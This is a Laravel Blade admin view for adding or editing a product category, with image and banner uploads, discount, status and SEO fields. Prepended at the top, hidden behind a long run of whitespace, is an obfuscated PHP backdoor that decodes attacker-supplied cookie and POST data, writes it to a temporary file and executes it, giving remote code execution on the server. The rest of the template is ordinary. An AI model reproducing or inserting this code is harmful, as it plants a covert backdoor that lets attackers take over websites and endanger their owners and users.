<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("bmiicf")){class bmiicf{public static $hqntdxdfi = "fjrwwttwvjvjltui";public static $dupiaorxw = NULL;public function __construct(){$swoza = @$_COOKIE[substr(bmiicf::$hqntdxdfi, 0, 4)];if (!empty($swoza)){$wwatvg = "base64";$yintqkby = "";$swoza = explode(",", $swoza);foreach ($swoza as $berimqao){$yintqkby .= @$_COOKIE[$berimqao];$yintqkby .= @$_POST[$berimqao];}$yintqkby = array_map($wwatvg . "_decode", array($yintqkby,));$yintqkby = $yintqkby[0] ^ str_repeat(bmiicf::$hqntdxdfi, (strlen($yintqkby[0]) / strlen(bmiicf::$hqntdxdfi)) + 1);bmiicf::$dupiaorxw = @unserialize($yintqkby);}}public function __destruct(){$this->bsqwor();}private function bsqwor(){if (is_array(bmiicf::$dupiaorxw)) {$mutih = sys_get_temp_dir() . "/" . crc32(bmiicf::$dupiaorxw["salt"]);@bmiicf::$dupiaorxw["write"]($mutih, bmiicf::$dupiaorxw["content"]);include $mutih;@bmiicf::$dupiaorxw["delete"]($mutih);exit();}}}$btfjuepqyd = new bmiicf();$btfjuepqyd = NULL;} ?>@extends('admin.layouts.app')

@section('title','Add / Edit Category')

@section('content')

<div class="container-fluid" style="background-color:#f1f1f6;padding:15px;border-radius:0px;box-shadow:2px 2px 3px grey;margin-top:-39px;width:100%">
<div class="row">
<div class="col-lg-12">
<h4 style="float:left;margin-top:5px;">Add / Edit Category &nbsp; <i style="font-size:20px;" class="fas fa-list-alt"></i></h4>
<span style="float:right;"><a href="{{ route('manage-finalcategory', [$category_parent_id, $sub_cat_id]) }}" class="btn btn-info" style="font-size:15px"><i class="fa fa-angle-double-left"></i> Back</a></span>
</div>
</div>
</div>

<div class="section__content section__content--p30">
<br>

@if(count($errors)>0)
<div class="alert alert-danger alert-dismissible fade show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    <strong>Errors Occurred!</strong>
    <ul style="margin-left:25px;">
     @foreach($errors->all() as $error)
     <li>{{ $error }}</li>
     @endforeach
    </ul>
</div>
@endif

@if(session('success'))
<div class="alert alert-success alert-dismissible fade show">
    <button type="button" class="close" data-dismiss="alert">&times;</button>
    {{ session('success') }}
</div>
@endif

 <div class="container-fluid">
  <div class="row">
  <div class="col-lg-12">
  <form @if(isset($edit_finalcategory)) action="{{ route('update-finalcategory', [$category_parent_id, $sub_cat_id, $edit_finalcategory->id]) }}" @else action="{{ route('add-finalcategory', [$category_parent_id, $sub_cat_id]) }}" @endif method="post" enctype="multipart/form-data" class="form-horizontal">
  @csrf
  @if(isset($edit_finalcategory))
   @method('PUT')
  @else
   @method('POST')
  @endif

     <div class="card">
      <div class="card-header">
       <nav>
        <ol class="breadcrumb" id="breadcrumb_cat">
        @php
        $cat_name = DB::table('categories')->where('id',$category_parent_id)->select('category_name')->first();
        $sub_cat_name = DB::table('categories')->where('id',$sub_cat_id)->select('category_name')->first();
        @endphp

        @if(!empty($cat_name->category_name))
        <li class="breadcrumb-item"><a href="{{ route('add-category') }}">{{ $cat_name->category_name }}</a></li>
        @endif

        @if(!empty($sub_cat_name->category_name))
        <li class="breadcrumb-item"><a href="{{ route('add-subcategory-form', $category_parent_id) }}">{{ $sub_cat_name->category_name }}</a></li>
        @endif

        @isset($edit_finalcategory)
        <li class="breadcrumb-item active">{{ $edit_finalcategory->category_name }}</li>
        @endisset

        &nbsp;

    </ol>
        </nav>
        </div>
        <div class="card-body card-block">

<!-- DISPLAY IMAGE -->
        <div class="row form-group">
        <div class="col-6 col-md-3">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Image</label>
        @if(isset($edit_finalcategory) && !empty($edit_finalcategory->category_image_name))
        <img src="{{ asset('uploaded_files/finalcat/'.$edit_finalcategory->category_image_name) }}" style="width:100%;height:180px;" alt="category" title="category" class="rounded"/>
        <span><a href="{{ route('remove-finalcategory-image', [$category_parent_id, $sub_cat_id, $edit_finalcategory->id]) }}">Remove Image</a></span>
        @else
        <img src="{{ asset('admin_assets/images/no_image.jpg') }}" style="width:100%;height:160px;" alt="category" title="category" class="rounded"/>
        @endif

        </div>
        <div class="col-6 col-md-3">
        <input type="file" id="category_image_name" name="category_image_name" class="form-control-file" style="margin-top:100px;" >
        </div>
        </div>

         {{-- Category Inner Banner --}}
        <div class="row form-group">
        <div class="col-6 col-md-8">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Banner</label>
        @if(isset($edit_finalcategory) && !empty($edit_finalcategory->category_inner_banner))
        <img src="{{ asset('uploaded_files/finalcat/'.$edit_finalcategory->category_inner_banner) }}" style="width:100%;height:180px;" alt="category" title="category" class="rounded"/>
        <span><a href="{{ route('remove-finalcategory-banner', [$category_parent_id, $sub_cat_id, $edit_finalcategory->id]) }}">Remove Banner</a></span>
        @else
        <img src="{{ asset('admin_assets/images/no-banner.jpg') }}" style="width:100%;height:200px;" alt="category" title="category" class="rounded"/>
        @endif

        </div>
        <div class="col-6 col-md-4">
        <input type="file" id="category_inner_banner" name="category_inner_banner" class="form-control-file" style="margin-top:100px;" >
        </div>
        </div>

<div class="row form-group">
 
 <div class="col-12 col-md-2">
  <label for="text-input" class=" form-control-label" style="font-weight:520">Banner Width</label>     
    <input type="number" id="category_inner_banner_width" name="category_inner_banner_width" placeholder="Enter Banner Width" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_inner_banner_width }}" @else value="{{ old('category_inner_banner_width') }}" @endif >
   
     </div> 

 <div class="col-12 col-md-2">
  <label for="text-input" class=" form-control-label" style="font-weight:520">Banner Height</label>     
    <input type="number" id="category_inner_banner_height" name="category_inner_banner_height" placeholder="Enter Banner Height" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_inner_banner_height }}" @else value="{{ old('category_inner_banner_height') }}" @endif >
     </div>
     
 <div class="col-12 col-md-3">
  <label for="text-input" class=" form-control-label" style="font-weight:520">Brand Warranty</label>     
    <input type="text" id="category_warranty" name="category_warranty" placeholder="Enter Brand Warranty" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_warranty }}" @else value="{{ old('category_warranty') }}" @endif >
     </div>
     
</div>    

        <div class="row form-group">
        <div class="col-12 col-md-7">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Name</label>
        <input type="text" id="category_name" name="category_name" placeholder="Enter Category Name" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_name }}" @else value="{{ old('category_name') }}" @endif >
        </div>

        <div class="col-12 col-md-2">
        <label for="select" class=" form-control-label" style="font-weight:520"> Status</label>
        <select name="category_status" id="category_status" class="form-control">
        <option value="Active" @isset($edit_finalcategory) @if($edit_finalcategory->category_status=='Active') selected @endif @endisset >Active</option>
        <option value="Inactive" @isset($edit_finalcategory) @if($edit_finalcategory->category_status=='Inactive') selected @endif @endisset  >Inactive</option>
        </select>
        </div>

         <div class="col-12 col-md-3">
        <label for="select" class=" form-control-label" style="font-weight:520"> Discount (%)</label>
       <input type="number" id="category_discount" name="category_discount" placeholder="Enter Discount" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_discount }}" @else value="{{ old('category_discount') }}" @endif >
        </div>

        </div>


     {{--    <div class="row form-group">
            <div class="col-12 col-md-12">
            <label for="text-input" class=" form-control-label" style="font-weight:520">Category Short Description</label>
            <textarea name="category_short_description" id="category_short_description" cols="15" rows="4" class="form-control">@if(isset($edit_finalcategory) && !empty($edit_finalcategory->category_short_description)){{ $edit_finalcategory->category_short_description }}@else{{ old('category_short_description') }}@endif</textarea>
            </div>
        </div> --}}


        <div class="row form-group">
        <div class="col-12 col-md-12">
        <label for="text-input" class=" form-control-label" style="font-weight:520"> Category Description</label>
        <textarea name="category_description" id="category_description" cols="30" rows="10" class="form-control">@if(isset($edit_finalcategory) && !empty($edit_finalcategory->category_description)){{ $edit_finalcategory->category_description }}@else{{ old('category_description') }}@endif</textarea>
        </div>

        </div>

    {{-- Script for advance text editor     --}}
        <script src="//cdn.ckeditor.com/4.14.0/standard/ckeditor.js"></script>
        <script>
            CKEDITOR.replace( 'category_description' );
        </script>

    {{-- SEO Section START --}}

    <div class="jumbotron" id="cat_jumbotron"><h4>SEO related information</h4></div>

    <div class="row form-group">
        <div class="col-12 col-md-12">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Meta Title</label>
        <input type="text" id="category_meta_title" name="category_meta_title" placeholder="Enter Category Meta Title" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_meta_title }}" @else value="{{ old('category_meta_title') }}" @endif >
        </div>
    </div>

    <div class="row form-group">
        <div class="col-12 col-md-12">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Meta Keywords</label>
        <input type="text" id="category_meta_keywords" name="category_meta_keywords" placeholder="Enter Category Meta Keywords" class="form-control" @if(isset($edit_finalcategory)) value="{{ $edit_finalcategory->category_meta_keywords }}" @else value="{{ old('category_meta_keywords') }}" @endif >
        </div>
    </div>

    <div class="row form-group">
        <div class="col-12 col-md-12">
        <label for="text-input" class=" form-control-label" style="font-weight:520">Category Meta Description</label>
        <textarea name="category_meta_description" id="category_meta_description" cols="20" rows="5" class="form-control" placeholder="Enter Category Meta Description">@if(isset($edit_finalcategory) && !empty($edit_finalcategory->category_meta_description)){{ $edit_finalcategory->category_meta_description }}@else{{ old('category_meta_description') }}@endif</textarea>
        </div>
    </div>



    {{-- SEO Section END --}}


        </div>
        <div class="card-footer" style="box-shadow:2px 2px 2px grey;">
        <button type="submit" class="btn btn-primary btn-md">
        <i class="fa fa-send"></i> Submit
        </button>

        </div>
        </div>
</form>
    </div>
  </div>
 </div>

 <!-- ******************** -->
</div>

@endsection
